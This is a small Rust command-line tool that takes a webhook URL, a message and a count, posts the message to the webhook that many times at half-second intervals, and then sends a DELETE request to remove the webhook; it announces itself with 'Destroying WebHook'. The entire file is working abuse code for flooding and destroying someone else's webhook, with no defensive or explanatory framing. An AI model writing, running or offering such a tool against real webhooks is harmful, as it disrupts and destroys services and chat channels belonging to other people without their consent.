use std::{
    env,
    collections::HashMap,
    thread,
    time,
};

use reqwest;

fn main() {
    let args: Vec<String> = env::args().collect();

    if args.len() != 4 {
        
        println!("Please input the webhook URL, a message, and a spam count!");
        panic!();

    }

    let webhook: String = args.get(1).unwrap().into();

    println!("Destroying WebHook @ {}", webhook);

    let client = reqwest::blocking::Client::new();

    let spam_count = args.get(3).unwrap().trim().parse().expect("Spam count must be valid integer!");        
    spam_webhook_and_delete(&client, &webhook, args.get(2).unwrap(), spam_count);

}

fn spam_webhook_and_delete(client: &reqwest::blocking::Client, webhook: &str, message: &str, spam_count: i32) {
    
    let mut body = HashMap::new();

    body.insert("content", message);

    let mut i = 0;

    while i != spam_count {
        
        thread::sleep(time::Duration::from_millis(500));

        let _ = client.post(webhook)
            .json(&body)
            .send();

        i += 1;

    }

    let _ = client.delete(webhook)
        .send();

}
